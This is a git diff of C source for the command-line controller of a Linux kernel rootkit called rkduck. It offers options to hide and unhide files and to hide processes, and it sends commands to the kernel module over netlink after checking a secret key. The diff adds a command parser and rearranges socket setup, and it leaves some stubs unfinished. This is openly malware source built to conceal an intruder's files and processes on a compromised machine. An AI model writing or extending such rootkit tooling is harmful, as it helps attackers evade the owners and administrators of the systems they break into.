@@ -5,7 +5,7 @@ const char *argp_program_bug_address = "<quokkalight@gmail.com>";
 static char doc[] = "Duck trainer.";
 static char args_doc[] = "[FILENAME]...";
 static struct argp_option options[] = { 
-    { "authenticate", 'a', "PATH", 0, "Hide the file PATH. PATH is an absolute path."},
+    { "authenticate", 'a', "SERCRET_KEY", 0, "Authentication is required to send commands to rkduck. SECRET_KEY should be the value of the secret key you specified in rkduck before compiling it."},
     { "hide-file", 'f', "PATH", 0, "Hide the file PATH. PATH is an absolute path."},
     { "unhide-file", 'g', "PATH", 0, "Unhide the file PATH. PATH is an absolute path."},
     { "hide-process", 'p', "PID", 0, "Hide the process of pid PID."},
@@ -27,9 +27,6 @@ static error_t parse_opt(int key, char *arg, struct argp_state *state) {
     struct nlmsghdr *nlh = NULL;
     int sock_fd;
     char *ret;
-
-    sock_fd = arguments->fd;
-    dst_addr = arguments->dst_addr;
     
     switch (key) {
     case 'a':
@@ -86,16 +83,59 @@ static error_t parse_opt(int key, char *arg, struct argp_state *state) {
 
 static struct argp argp = { options, parse_opt, args_doc, doc, 0, 0, 0 };
 
+void parse_cmd(char *user_cmd, struct cmd_t *cmd)
+{
+    char *arg;
+    int offset;
+    int id;
+    int length;
+
+    printf("%s\n", user_cmd);
+    arg = strstr(user_cmd, ":");
+    
+    if(arg == NULL) {
+        /* TO DO: printk */
+    }
+    else {
+        offset = arg-user_cmd;
+        *(user_cmd+offset) = 0;
+
+        errno = 0;
+        id = strtol(user_cmd, &arg, 10);
+
+        if (errno != 0) {
+            /* TO DO: printk */
+        }
+        else {
+            cmd->id = id;
+            arg++;
+            length = strlen(arg);
+
+            if (length > PATH_MAX)
+                length = PATH_MAX;
+
+            user_cmd = malloc(sizeof(char) * length);
+            memset(user_cmd, 0, length);
+            memcpy(user_cmd, arg, length);
+            cmd->arg = user_cmd;
+        }
+    }
+
+}
+
 int main(int argc, char *argv[])
 {
     struct sockaddr_nl src_addr, dst_addr;
     int sock_fd;
     int ret;
+    struct cmd_t cmd;
 
     struct arguments arguments;
     arguments.auth = 0;
 
     sock_fd = socket_init(&src_addr, &dst_addr);
+    arguments.dst_addr = dst_addr;
+    arguments.fd = sock_fd;
 
     argp_parse(&argp, argc, argv, 0, 0, &arguments);
 
@@ -140,6 +180,9 @@ void* send_msg_lkm(struct arguments *arguments, const char *format, ...)
     int sock_fd = arguments->fd;
     struct sockaddr_nl dst_addr = arguments->dst_addr;
 
+    /*TO DELETE*/
+    struct cmd_t cmd;
+
     if (arguments->auth == 1) {
         va_start(ap, format);
 
@@ -163,13 +206,16 @@ void* send_msg_lkm(struct arguments *arguments, const char *format, ...)
         msg.msg_iov = &iov;
         msg.msg_iovlen = 1;
 
+
         sendmsg(sock_fd, &msg, 0);
         recvmsg(sock_fd, &msg, 0);
+
+        parse_cmd(NLMSG_DATA(nlh), &cmd);
 
         free(nlh);
     } else {
         arguments->auth = 0;
-        printf("[+] You need to be authenticated.\n[+] Use --help to get more information about the available commands.\n");
+        printf("[+] You need to give a secret key.\n[+] Use --help to get more information about the available commands.\n");
         exit(0);
     }
 
